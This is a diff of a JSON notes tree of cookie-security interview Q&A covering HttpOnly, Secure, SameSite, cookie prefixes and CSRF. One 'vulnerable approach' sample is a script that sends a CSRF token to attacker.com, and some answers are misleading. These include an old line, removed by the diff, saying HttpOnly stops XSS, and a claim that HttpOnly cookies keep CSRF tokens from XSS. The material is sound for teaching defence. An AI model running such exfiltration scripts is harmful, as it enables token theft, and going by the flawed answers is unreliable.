-              "markdown": "**Answer:** **No, HttpOnly does NOT protect against CSRF attacks.**\n\nThis is a common misconception. HttpOnly only prevents JavaScript from accessing cookies, but CSRF attacks don't require JavaScript access to cookies.\n\n**How CSRF works:**\n\n1. User is logged into a website (has session cookie)\n2. User visits attacker's website\n3. Attacker's website submits a form to the target website\n4. Browser automatically includes the user's cookies with the request\n5. Target website processes the request with valid cookies\n6. Attack succeeds\n\n**Why HttpOnly doesn't help:**",
+              "markdown": "Answer: No, HttpOnly does NOT protect against CSRF attacks.\n\nThis is a common misconception. HttpOnly only prevents JavaScript from accessing cookies, but CSRF attacks don't require JavaScript access to cookies.\n\nHow CSRF works:\n\n1. User is logged into a website (has session cookie)\n2. User visits attacker's website\n3. Attacker's website submits a form to the target website\n4. Browser automatically includes the user's cookies with the request\n5. Target website processes the request with valid cookies\n6. Attack succeeds\n\nWhy HttpOnly doesn't help:",
               "notes": "Answer: No, HttpOnly does NOT protect against CSRF attacks.\n\nThis is a common misconception. HttpOnly only prevents JavaScript from accessing cookies, but CSRF attacks don't require JavaScript access to cookies.\n\nHow CSRF works:\n\n1. User is logged into a website (has session cookie)\n2. User visits attacker's website\n3. Attacker's website submits a form to the target website\n4. Browser automatically includes the user's cookies with the request\n5. Target website processes the request with valid cookies\n6. Attack succeeds\n\nWhy HttpOnly doesn't help:",
               "kind": "topic",
               "level": 3,
@@ -5671,7 +5671,7 @@
             {
               "id": "nb4a5e3414f5eed9",
               "title": "What is the SameSite attribute and how does it protect against CSRF?",
-              "markdown": "**Answer:** The `SameSite` attribute controls whether cookies are sent with cross-site requests, providing protection against CSRF attacks.\n\n**Values:**\n\n1. **`SameSite=Strict`**: Cookie sent only with same-site requests",
+              "markdown": "Answer: The `SameSite` attribute controls whether cookies are sent with cross-site requests, providing protection against CSRF attacks.\n\nValues:\n\n1. `SameSite=Strict`: Cookie sent only with same-site requests",
               "notes": "Answer: The SameSite attribute controls whether cookies are sent with cross-site requests, providing protection against CSRF attacks.\n\nValues:\n\n1. SameSite=Strict: Cookie sent only with same-site requests",
               "kind": "topic",
               "level": 3,
@@ -5782,7 +5782,7 @@
             {
               "id": "n167205214de96a3",
               "title": "What are cookie prefixes (__Secure- and __Host-)?",
-              "markdown": "**Answer:** Cookie prefixes provide additional security by enforcing constraints at the browser level.\n\n**`__Secure-` prefix:**",
+              "markdown": "Answer: Cookie prefixes provide additional security by enforcing constraints at the browser level.\n\n`__Secure-` prefix:",
               "notes": "Answer: Cookie prefixes provide additional security by enforcing constraints at the browser level.\n\nSecure- prefix:",
               "kind": "topic",
               "level": 3,
@@ -5905,7 +5905,7 @@
             {
               "id": "n1574f8c84f15282",
               "title": "How would you configure cookies to prevent both XSS and CSRF attacks?",
-              "markdown": "**Answer:** Use a combination of `HttpOnly`, `Secure`, and `SameSite` attributes:\n\n```jsx\nSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n\n```\n\n**Breakdown:**",
+              "markdown": "Answer: Use a combination of `HttpOnly`, `Secure`, and `SameSite` attributes:\n\n```jsx\nSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n\n```\n\nBreakdown:",
               "notes": "Answer: Use a combination of HttpOnly, Secure, and SameSite attributes:\n\nSet-Cookie: Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n\nBreakdown:",
               "kind": "topic",
               "level": 3,
@@ -5994,7 +5994,7 @@
             {
               "id": "nfcf9fda325fbc30",
               "title": "A user reports that they get logged out when clicking links from...",
-              "markdown": "**Answer:** This is likely caused by `SameSite=Strict` on the session cookie.\n\n**Explanation:**",
+              "markdown": "Answer: This is likely caused by `SameSite=Strict` on the session cookie.\n\nExplanation:",
               "notes": "Answer: This is likely caused by SameSite=Strict on the session cookie.\n\nExplanation:",
               "kind": "topic",
               "level": 3,
@@ -6116,7 +6116,7 @@
             {
               "id": "n99d7051db117be4",
               "title": "Your application needs to work with third-party widgets. How do you...",
-              "markdown": "**Answer:** For third-party integrations, you need `SameSite=None` with `Secure`:\n\n```jsx\nSet-Cookie: __Secure-widgetSession=abc123; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800\n\n```\n\n**Important considerations:**",
+              "markdown": "Answer: For third-party integrations, you need `SameSite=None` with `Secure`:\n\n```jsx\nSet-Cookie: __Secure-widgetSession=abc123; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800\n\n```\n\nImportant considerations:",
               "notes": "Answer: For third-party integrations, you need SameSite=None with Secure:\n\nSet-Cookie: Secure-widgetSession=abc123; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800\n\nImportant considerations:",
               "kind": "topic",
               "level": 3,
@@ -6183,7 +6183,7 @@
             {
               "id": "ne86abde37896858",
               "title": "You discover that your session cookies are being sent over HTTP....",
-              "markdown": "**Answer:** The cookies are missing the `Secure` attribute.\n\n**Problem:**\n\n```jsx\n// Vulnerable configurationSet-Cookie: sessionId=abc123; HttpOnly\n// Missing Secure attribute - sent over HTTP\n```\n\n**Solution:**\n\n```jsx\n// Secure configurationSet-Cookie: sessionId=abc123; HttpOnly; Secure\n// Only sent over HTTPS\n```\n\n**Additional checks:**",
+              "markdown": "Answer: The cookies are missing the `Secure` attribute.\n\nProblem:\n\n```jsx\n// Vulnerable configurationSet-Cookie: sessionId=abc123; HttpOnly\n// Missing Secure attribute - sent over HTTP\n```\n\nSolution:\n\n```jsx\n// Secure configurationSet-Cookie: sessionId=abc123; HttpOnly; Secure\n// Only sent over HTTPS\n```\n\nAdditional checks:",
               "notes": "Answer: The cookies are missing the Secure attribute.\n\nProblem:\n\n// Vulnerable configurationSet-Cookie: sessionId=abc123; HttpOnly\n// Missing Secure attribute - sent over HTTP\n\nSolution:\n\n// Secure configurationSet-Cookie: sessionId=abc123; HttpOnly; Secure\n// Only sent over HTTPS\n\nAdditional checks:",
               "kind": "topic",
               "level": 3,
@@ -6239,7 +6239,7 @@
             {
               "id": "n60d11f10cd85469",
               "title": "An attacker successfully performs a CSRF attack even though your...",
-              "markdown": "**Answer:** HttpOnly does NOT protect against CSRF attacks. The attacker's CSRF attack succeeded because:",
+              "markdown": "Answer: HttpOnly does NOT protect against CSRF attacks. The attacker's CSRF attack succeeded because:",
               "notes": "Answer: HttpOnly does NOT protect against CSRF attacks. The attacker's CSRF attack succeeded because:",
               "kind": "topic",
               "level": 3,
@@ -6284,7 +6284,7 @@
             {
               "id": "na2e8a581549e37f",
               "title": "Your multi-tenant SaaS application has cookies accessible across...",
-              "markdown": "**Answer:** Use the `__Host-` prefix to prevent subdomain access:\n\n**Problem:**\n\n```jsx\n// Vulnerable - accessible to all subdomainsSet-Cookie: sessionId=abc123; Domain=.example.com; Secure; HttpOnly\n// tenant1.example.com can access tenant2.example.com's cookies\n```\n\n**Solution:**\n\n```jsx\n// Secure - only accessible to exact hostSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; Path=/\n// tenant1.example.com cannot access tenant2.example.com's cookies\n```\n\n**Why `__Host-` prefix works:**",
+              "markdown": "Answer: Use the `__Host-` prefix to prevent subdomain access:\n\nProblem:\n\n```jsx\n// Vulnerable - accessible to all subdomainsSet-Cookie: sessionId=abc123; Domain=.example.com; Secure; HttpOnly\n// tenant1.example.com can access tenant2.example.com's cookies\n```\n\nSolution:\n\n```jsx\n// Secure - only accessible to exact hostSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; Path=/\n// tenant1.example.com cannot access tenant2.example.com's cookies\n```\n\nWhy `__Host-` prefix works:",
               "notes": "Answer: Use the Host- prefix to prevent subdomain access:\n\nProblem:\n\n// Vulnerable - accessible to all subdomainsSet-Cookie: sessionId=abc123; Domain=.example.com; Secure; HttpOnly\n// tenant1.example.com can access tenant2.example.com's cookies\n\nSolution:\n\n// Secure - only accessible to exact hostSet-Cookie: Host-sessionId=abc123; Secure; HttpOnly; Path=/\n// tenant1.example.com cannot access tenant2.example.com's cookies\n\nWhy Host- prefix works:",
               "kind": "topic",
               "level": 3,
@@ -6340,7 +6340,7 @@
             {
               "id": "n482a0e3b568d27e",
               "title": "Your CSRF tokens are being stolen via XSS. How do you protect them?",
-              "markdown": "**Answer:** Store CSRF tokens in HttpOnly cookies:\n\n**Vulnerable approach:**\n\n```jsx\n// CSRF token in regular cookie (accessible to JavaScript)Set-Cookie: csrf_token=abc123\n// XSS can steal it:\n<script>\n  var token = document.cookie.match(/csrf_token=([^;]+)/)[1];\n  fetch('https://attacker.com/steal?token=' + token);\n</script>\n\n```\n\n**Secure approach:**\n\n```jsx\n// CSRF token in HttpOnly cookieSet-Cookie: csrf_token=abc123; HttpOnly; Secure; SameSite=Strict\n\n// XSS cannot access it:\n<script>\n  console.log(document.cookie);// Does NOT include csrf_token// Token cannot be stolen\n</script>\n\n```\n\n**How CSRF tokens work with HttpOnly:**\n\n1. Server generates unique token for each session\n2. Token stored in HttpOnly cookie (prevents XSS theft)\n3. Token also embedded in forms (hidden input or meta tag)\n4. On form submission, server compares cookie token with form token\n5. If they match, request is legitimate\n6. If they don't match, request is rejected\n\n**Important note:**",
+              "markdown": "Answer: Store CSRF tokens in HttpOnly cookies:\n\nVulnerable approach:\n\n```jsx\n// CSRF token in regular cookie (accessible to JavaScript)Set-Cookie: csrf_token=abc123\n// XSS can steal it:\n<script>\n  var token = document.cookie.match(/csrf_token=([^;]+)/)[1];\n  fetch('https://attacker.com/steal?token=' + token);\n</script>\n\n```\n\nSecure approach:\n\n```jsx\n// CSRF token in HttpOnly cookieSet-Cookie: csrf_token=abc123; HttpOnly; Secure; SameSite=Strict\n\n// XSS cannot access it:\n<script>\n  console.log(document.cookie);// Does NOT include csrf_token// Token cannot be stolen\n</script>\n\n```\n\nHow CSRF tokens work with HttpOnly:\n\n1. Server generates unique token for each session\n2. Token stored in HttpOnly cookie (prevents XSS theft)\n3. Token also embedded in forms (hidden input or meta tag)\n4. On form submission, server compares cookie token with form token\n5. If they match, request is legitimate\n6. If they don't match, request is rejected\n\nImportant note:",
               "notes": "Answer: Store CSRF tokens in HttpOnly cookies:\n\nVulnerable approach:\n\n// CSRF token in regular cookie (accessible to JavaScript)Set-Cookie: csrftoken=abc123\n// XSS can steal it:\n<script>\n  var token = document.cookie.match(/csrftoken=([^;]+)/)[1];\n  fetch('https://attacker.com/steal?token=' + token);\n</script>\n\nSecure approach:\n\n// CSRF token in HttpOnly cookieSet-Cookie: csrftoken=abc123; HttpOnly; Secure; SameSite=Strict\n\n// XSS cannot access it:\n<script>\n  console.log(document.cookie);// Does NOT include csrftoken// Token cannot be stolen\n</script>\n\nHow CSRF tokens work with HttpOnly:\n\n1. Server generates unique token for each session\n2. Token stored in HttpOnly cookie (prevents XSS theft)\n3. Token also embedded in forms (hidden input or meta tag)\n4. On form submission, server compares cookie token with form token\n5. If they match, request is legitimate\n6. If they don't match, request is rejected\n\nImportant note:",
               "kind": "topic",
               "level": 3,
@@ -6397,7 +6397,7 @@
             {
               "id": "n90ba57b942d682d",
               "title": "How do you set secure cookies in Node.js/Express?",
-              "markdown": "**Answer:**\n\n```jsx\nconst express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\napp.post('/login', (req, res) => {\n  const sessionToken = generateSessionToken();\n\n  res.cookie('__Host-sessionId', sessionToken, {\n    secure: true,// HTTPS onlyhttpOnly: true,// No JavaScript accesssameSite: 'strict',// CSRF protectionpath: '/',// Site-widemaxAge: 3600000,// 1 hour (in milliseconds)// Note: __Host- prefix requires no domain option\n  });\n\n  res.json({ success: true });\n});\n\n```\n\n**Key points:**",
+              "markdown": "Answer:\n\n```jsx\nconst express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\napp.post('/login', (req, res) => {\n  const sessionToken = generateSessionToken();\n\n  res.cookie('__Host-sessionId', sessionToken, {\n    secure: true,// HTTPS onlyhttpOnly: true,// No JavaScript accesssameSite: 'strict',// CSRF protectionpath: '/',// Site-widemaxAge: 3600000,// 1 hour (in milliseconds)// Note: __Host- prefix requires no domain option\n  });\n\n  res.json({ success: true });\n});\n\n```\n\nKey points:",
               "notes": "Answer:\n\nconst express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\napp.post('/login', (req, res) => {\n  const sessionToken = generateSessionToken();\n\n  res.cookie('Host-sessionId', sessionToken, {\n    secure: true,// HTTPS onlyhttpOnly: true,// No JavaScript accesssameSite: 'strict',// CSRF protectionpath: '/',// Site-widemaxAge: 3600000,// 1 hour (in milliseconds)// Note: Host- prefix requires no domain option\n  });\n\n  res.json({ success: true });\n});\n\nKey points:",
               "kind": "topic",
               "level": 3,
@@ -6464,7 +6464,7 @@
             {
               "id": "nab3e20bef61b089",
               "title": "How do you set secure cookies in Python/Flask?",
-              "markdown": "**Answer:**\n\n```python\nfrom flask import Flask, make_response\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    session_token = generate_session_token()\n    response = make_response({'success': True})\n\n    response.set_cookie(\n        '__Host-sessionId',\n        value=session_token,\n        secure=True,# HTTPS only\n        httponly=True,# No JavaScript access\n        samesite='Strict',# CSRF protection\n        path='/',# Site-wide\n        max_age=3600,# 1 hour (in seconds)# Note: __Host- prefix requires no domain parameter\n    )\n\n    return response\n\n```\n\n**Key points:**",
+              "markdown": "Answer:\n\n```python\nfrom flask import Flask, make_response\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    session_token = generate_session_token()\n    response = make_response({'success': True})\n\n    response.set_cookie(\n        '__Host-sessionId',\n        value=session_token,\n        secure=True,# HTTPS only\n        httponly=True,# No JavaScript access\n        samesite='Strict',# CSRF protection\n        path='/',# Site-wide\n        max_age=3600,# 1 hour (in seconds)# Note: __Host- prefix requires no domain parameter\n    )\n\n    return response\n\n```\n\nKey points:",
               "notes": "Answer:\n\nfrom flask import Flask, makeresponse\n\napp = Flask(name)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    sessiontoken = generatesessiontoken()\n    response = makeresponse({'success': True})\n\n    response.setcookie(\n        'Host-sessionId',\n        value=sessiontoken,\n        secure=True,# HTTPS only\n        httponly=True,# No JavaScript access\n        samesite='Strict',# CSRF protection\n        path='/',# Site-wide\n        maxage=3600,# 1 hour (in seconds)# Note: Host- prefix requires no domain parameter\n    )\n\n    return response\n\nKey points:",
               "kind": "topic",
               "level": 3,
@@ -6531,7 +6531,7 @@
             {
               "id": "ncb604d3aa85e1d5",
               "title": "How do you verify that cookies are set correctly?",
-              "markdown": "**Answer:** Multiple ways to verify:\n\n**1. Browser DevTools:**\n\n```\n1. Open DevTools (F12)\n2. Go to Application/Storage tab (Chrome) or Storage tab (Firefox)\n3. Click Cookies\n4. View cookie attributes:\n```",
+              "markdown": "Answer: Multiple ways to verify:\n\n1. Browser DevTools:\n\n```\n1. Open DevTools (F12)\n2. Go to Application/Storage tab (Chrome) or Storage tab (Firefox)\n3. Click Cookies\n4. View cookie attributes:\n```",
               "notes": "Answer: Multiple ways to verify:\n\n1. Browser DevTools:\n\n1. Open DevTools (F12)\n2. Go to Application/Storage tab (Chrome) or Storage tab (Firefox)\n3. Click Cookies\n4. View cookie attributes:",
               "kind": "topic",
               "level": 3,
@@ -6632,18 +6632,74 @@
             {
               "id": "nc961bf735d6f62d",
               "title": "Cookies are not being set. What could be wrong?",
-              "markdown": "**Answer:** Common issues:\n\n**1. Missing Secure on HTTP:**\n\n```jsx\n// Problem: Secure cookie on HTTP connection// Browser will reject itSet-Cookie: sessionId=abc123; Secure\n// Solution: Use HTTPS or remove Secure (not recommended)\n```\n\n**2. Invalid SameSite=None without Secure:**\n\n```jsx\n// Problem: SameSite=None requires SecureSet-Cookie: sessionId=abc123; SameSite=None\n// Browser will reject it// Solution: Add Secure attributeSet-Cookie: sessionId=abc123; SameSite=None; Secure\n\n```\n\n**3. Invalid __Host- prefix usage:**\n\n```jsx\n// Problem: __Host- prefix with Domain attributeSet-Cookie: __Host-sessionId=abc123; Domain=example.com; Secure; Path=/\n// Browser will reject it// Solution: Remove Domain attributeSet-Cookie: __Host-sessionId=abc123; Secure; Path=/\n\n```\n\n**4. Path mismatch:**\n\n```jsx\n// Cookie set with Path=/apiSet-Cookie: sessionId=abc123; Path=/api\n// Cookie not sent with requests to /// Solution: Use Path=/ for site-wide cookies\n```\n\n**5. Domain mismatch:**\n\n```jsx\n// Cookie set for example.comSet-Cookie: sessionId=abc123; Domain=example.com\n// Cookie not sent to www.example.com (if Domain not set)// Or cookie sent to all subdomains (if Domain=.example.com)\n```",
-              "notes": "Answer: Common issues:\n\n1. Missing Secure on HTTP:\n\n// Problem: Secure cookie on HTTP connection// Browser will reject itSet-Cookie: sessionId=abc123; Secure\n// Solution: Use HTTPS or remove Secure (not recommended)\n\n2. Invalid SameSite=None without Secure:\n\n// Problem: SameSite=None requires SecureSet-Cookie: sessionId=abc123; SameSite=None\n// Browser will reject it// Solution: Add Secure attributeSet-Cookie: sessionId=abc123; SameSite=None; Secure\n\n3. Invalid Host- prefix usage:\n\n// Problem: Host- prefix with Domain attributeSet-Cookie: Host-sessionId=abc123; Domain=example.com; Secure; Path=/\n// Browser will reject it// Solution: Remove Domain attributeSet-Cookie: Host-sessionId=abc123; Secure; Path=/\n\n4. Path mismatch:\n\n// Cookie set with Path=/apiSet-Cookie: sessionId=abc123; Path=/api\n// Cookie not sent with requests to /// Solution: Use Path=/ for site-wide cookies\n\n5. Domain mismatch:\n\n// Cookie set for example.comSet-Cookie: sessionId=abc123; Domain=example.com\n// Cookie not sent to www.example.com (if Domain not set)// Or cookie sent to all subdomains (if Domain=.example.com)",
+              "markdown": "Answer: Common issues:",
+              "notes": "Answer: Common issues:",
               "kind": "topic",
               "level": 3,
-              "children": [],
-              "blurb": "Answer: Common issues: 1.",
+              "children": [
+                {
+                  "id": "n34730603eb004bb",
+                  "title": "Missing Secure on HTTP",
+                  "markdown": "- Missing Secure on HTTP",
+                  "notes": "Missing Secure on HTTP",
+                  "blurb": "Missing Secure on HTTP",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nd153c01f9fd3bae",
+                  "title": "Invalid SameSite=None without Secure",
+                  "markdown": "- Invalid SameSite=None without Secure",
+                  "notes": "Invalid SameSite=None without Secure",
+                  "blurb": "Invalid SameSite=None without Secure",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n9dd0c6b20a473f3",
+                  "title": "Invalid __Host- prefix usage",
+                  "markdown": "- Invalid __Host- prefix usage",
+                  "notes": "Invalid __Host- prefix usage",
+                  "blurb": "Invalid Host- prefix usage",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n4323811e4026d94",
+                  "title": "Path mismatch",
+                  "markdown": "- Path mismatch",
+                  "notes": "Path mismatch",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "na9345b891060b12",
+                  "title": "Domain mismatch",
+                  "markdown": "- Domain mismatch",
+                  "notes": "Domain mismatch",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Answer: Common issues:",
               "expanded": false
             },
             {
               "id": "n79596c51b88a726",
               "title": "Users are getting logged out unexpectedly. What could cause this?",
-              "markdown": "**Answer:** Common causes:\n\n**1. SameSite=Strict with external links:**\n\n```jsx\n// Problem: Cookie not sent with external link clicksSet-Cookie: sessionId=abc123; SameSite=Strict\n// Solution: Use SameSite=LaxSet-Cookie: sessionId=abc123; SameSite=Lax\n\n```\n\n**2. Cookie expiration:**\n\n```jsx\n// Problem: Short Max-AgeSet-Cookie: sessionId=abc123; Max-Age=300// 5 minutes// Solution: Increase Max-Age or implement refresh mechanismSet-Cookie: sessionId=abc123; Max-Age=3600// 1 hour\n```\n\n**3. Browser blocking third-party cookies:**\n\n```jsx\n// Problem: SameSite=None cookies blockedSet-Cookie: sessionId=abc123; SameSite=None; Secure\n// Some browsers block third-party cookies by default// Solution: Use alternative authentication (OAuth, tokens)\n```\n\n**4. Server-side session expiration:**",
+              "markdown": "Answer: Common causes:\n\n1. SameSite=Strict with external links:\n\n```jsx\n// Problem: Cookie not sent with external link clicksSet-Cookie: sessionId=abc123; SameSite=Strict\n// Solution: Use SameSite=LaxSet-Cookie: sessionId=abc123; SameSite=Lax\n\n```\n\n2. Cookie expiration:\n\n```jsx\n// Problem: Short Max-AgeSet-Cookie: sessionId=abc123; Max-Age=300// 5 minutes// Solution: Increase Max-Age or implement refresh mechanismSet-Cookie: sessionId=abc123; Max-Age=3600// 1 hour\n```\n\n3. Browser blocking third-party cookies:\n\n```jsx\n// Problem: SameSite=None cookies blockedSet-Cookie: sessionId=abc123; SameSite=None; Secure\n// Some browsers block third-party cookies by default// Solution: Use alternative authentication (OAuth, tokens)\n```\n\n4. Server-side session expiration:",
               "notes": "Answer: Common causes:\n\n1. SameSite=Strict with external links:\n\n// Problem: Cookie not sent with external link clicksSet-Cookie: sessionId=abc123; SameSite=Strict\n// Solution: Use SameSite=LaxSet-Cookie: sessionId=abc123; SameSite=Lax\n\n2. Cookie expiration:\n\n// Problem: Short Max-AgeSet-Cookie: sessionId=abc123; Max-Age=300// 5 minutes// Solution: Increase Max-Age or implement refresh mechanismSet-Cookie: sessionId=abc123; Max-Age=3600// 1 hour\n\n3. Browser blocking third-party cookies:\n\n// Problem: SameSite=None cookies blockedSet-Cookie: sessionId=abc123; SameSite=None; Secure\n// Some browsers block third-party cookies by default// Solution: Use alternative authentication (OAuth, tokens)\n\n4. Server-side session expiration:",
               "kind": "topic",
               "level": 3,
@@ -6700,7 +6756,7 @@
             {
               "id": "n1c657fd6787bddd",
               "title": "Explain the difference between HttpOnly, Secure, and SameSite...",
-              "markdown": "**Answer:**\n\n| Attribute | Protects Against | How It Works | When to Use |\n| --- | --- | --- | --- |\n| **HttpOnly** | XSS (cookie theft) | Prevents JavaScript access to cookies | Always for sensitive cookies |\n| **Secure** | MitM attacks | Ensures HTTPS-only transmission | Always in production |\n| **SameSite** | CSRF attacks | Controls cross-site cookie sending | Always (Strict or Lax) |\n\n**HttpOnly:**",
+              "markdown": "Answer:\n\n| Attribute | Protects Against | How It Works | When to Use |\n| --- | --- | --- | --- |\n| HttpOnly | XSS (cookie theft) | Prevents JavaScript access to cookies | Always for sensitive cookies |\n| Secure | MitM attacks | Ensures HTTPS-only transmission | Always in production |\n| SameSite | CSRF attacks | Controls cross-site cookie sending | Always (Strict or Lax) |\n\nHttpOnly:",
               "notes": "Answer:\n\n| Attribute | Protects Against | How It Works | When to Use |\n| --- | --- | --- | --- |\n| HttpOnly | XSS (cookie theft) | Prevents JavaScript access to cookies | Always for sensitive cookies |\n| Secure | MitM attacks | Ensures HTTPS-only transmission | Always in production |\n| SameSite | CSRF attacks | Controls cross-site cookie sending | Always (Strict or Lax) |\n\nHttpOnly:",
               "kind": "topic",
               "level": 3,
@@ -6822,7 +6878,7 @@
             {
               "id": "ne3c0c03f448eed4",
               "title": "How do you implement \"Remember Me\" functionality securely?",
-              "markdown": "**Answer:** Use separate cookies with different lifespans:\n\n```jsx\n// Short-lived session cookieSet-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600\n\n// Long-lived remember me tokenSet-Cookie: __Secure-rememberToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=2592000\n\n```\n\n**Implementation:**\n\n1. User logs in and checks \"Remember Me\"\n2. Server generates two tokens:",
+              "markdown": "Answer: Use separate cookies with different lifespans:\n\n```jsx\n// Short-lived session cookieSet-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600\n\n// Long-lived remember me tokenSet-Cookie: __Secure-rememberToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=2592000\n\n```\n\nImplementation:\n\n1. User logs in and checks \"Remember Me\"\n2. Server generates two tokens:",
               "notes": "Answer: Use separate cookies with different lifespans:\n\n// Short-lived session cookieSet-Cookie: Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600\n\n// Long-lived remember me tokenSet-Cookie: Secure-rememberToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=2592000\n\nImplementation:\n\n1. User logs in and checks \"Remember Me\"\n2. Server generates two tokens:",
               "kind": "topic",
               "level": 3,
@@ -6944,7 +7000,7 @@
             {
               "id": "na8899f229c39031",
               "title": "How do cookie security attributes work together in a defense-in-depth...",
-              "markdown": "**Answer:** Each attribute provides a different layer of protection:\n\n**Layer 1: HttpOnly (XSS Protection)**\n\n```jsx\nHttpOnly: Prevents JavaScript from stealing cookies\n\n```\n\n**Layer 2: Secure (Transmission Protection)**\n\n```jsx\nSecure: Ensures cookies only sent over HTTPS\n\n```\n\n**Layer 3: SameSite (CSRF Protection)**\n\n```jsx\nSameSite: Prevents cookies from being sent with cross-site requests\n\n```\n\n**Layer 4: Cookie Prefixes (Enforcement)**\n\n```jsx\n__Host- or __Secure-: Browser-level enforcement of security rules\n\n```\n\n**Layer 5: Short Expiration (Exposure Limitation)**\n\n```jsx\nMax-Age: Limits window of exposure if cookie is compromised\n\n```\n\n**Complete defense-in-depth:**\n\n```jsx\nSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n\n```\n\n**Additional layers:**",
+              "markdown": "Answer: Each attribute provides a different layer of protection:\n\nLayer 1: HttpOnly (XSS Protection)\n\n```jsx\nHttpOnly: Prevents JavaScript from stealing cookies\n\n```\n\nLayer 2: Secure (Transmission Protection)\n\n```jsx\nSecure: Ensures cookies only sent over HTTPS\n\n```\n\nLayer 3: SameSite (CSRF Protection)\n\n```jsx\nSameSite: Prevents cookies from being sent with cross-site requests\n\n```\n\nLayer 4: Cookie Prefixes (Enforcement)\n\n```jsx\n__Host- or __Secure-: Browser-level enforcement of security rules\n\n```\n\nLayer 5: Short Expiration (Exposure Limitation)\n\n```jsx\nMax-Age: Limits window of exposure if cookie is compromised\n\n```\n\nComplete defense-in-depth:\n\n```jsx\nSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n\n```\n\nAdditional layers:",
               "notes": "Answer: Each attribute provides a different layer of protection:\n\nLayer 1: HttpOnly (XSS Protection)\n\nHttpOnly: Prevents JavaScript from stealing cookies\n\nLayer 2: Secure (Transmission Protection)\n\nSecure: Ensures cookies only sent over HTTPS\n\nLayer 3: SameSite (CSRF Protection)\n\nSameSite: Prevents cookies from being sent with cross-site requests\n\nLayer 4: Cookie Prefixes (Enforcement)\n\nHost- or Secure-: Browser-level enforcement of security rules\n\nLayer 5: Short Expiration (Exposure Limitation)\n\nMax-Age: Limits window of exposure if cookie is compromised\n\nComplete defense-in-depth:\n\nSet-Cookie: Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n\nAdditional layers:",
               "kind": "topic",
               "level": 3,
@@ -7078,29 +7134,29 @@
             {
               "id": "n62413a118f871fd",
               "title": "What protects against XSS?",
-              "markdown": "**Answer:** HttpOnly attribute",
-              "notes": "Answer: HttpOnly attribute",
+              "markdown": "Answer: Encode output for the sink, and use CSP as a backstop. HttpOnly only stops script from reading the cookie. It does not stop XSS.",
+              "notes": "Answer: Encode output for the sink, and use CSP as a backstop. HttpOnly only stops script from reading the cookie. It does not stop XSS.",
               "kind": "topic",
               "level": 3,
               "children": [],
-              "blurb": "Answer: HttpOnly attribute",
+              "blurb": "Answer: Encode output for the sink, and use CSP as a backstop.",
               "expanded": false
             },
             {
               "id": "n07149a0adb48817",
               "title": "What protects against CSRF?",
-              "markdown": "**Answer:** SameSite attribute (Strict or Lax) or CSRF tokens",
-              "notes": "Answer: SameSite attribute (Strict or Lax) or CSRF tokens",
+              "markdown": "Answer: A CSRF token, plus SameSite=Lax or Strict. Lax still sends the cookie on a top-level GET, so do not change state on GET.",
+              "notes": "Answer: A CSRF token, plus SameSite=Lax or Strict. Lax still sends the cookie on a top-level GET, so do not change state on GET.",
               "kind": "topic",
               "level": 3,
               "children": [],
-              "blurb": "Answer: SameSite attribute (Strict or Lax) or CSRF tokens",
+              "blurb": "Answer: A CSRF token, plus SameSite=Lax or Strict.",
               "expanded": false
             },
             {
               "id": "n8a2ef8d5b1f27f4",
               "title": "What protects against MitM attacks?",
-              "markdown": "**Answer:** Secure attribute (HTTPS)",
+              "markdown": "Answer: Secure attribute (HTTPS)",
               "notes": "Answer: Secure attribute (HTTPS)",
               "kind": "topic",
               "level": 3,
@@ -7111,7 +7167,7 @@
             {
               "id": "na3ddf99e5ef72b2",
               "title": "What is the recommended cookie configuration?",
-              "markdown": "**Answer:** `__Secure-sessionId=token; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600`",
+              "markdown": "Answer: `__Secure-sessionId=token; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600`",
               "notes": "Answer: Secure-sessionId=token; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600",
               "kind": "topic",
               "level": 3,
@@ -7122,12 +7178,12 @@
             {
               "id": "n42bfae09ac73b15",
               "title": "Does HttpOnly protect against CSRF?",
-              "markdown": "**Answer:** No, HttpOnly only protects against XSS. Use SameSite or CSRF tokens for CSRF protection.",
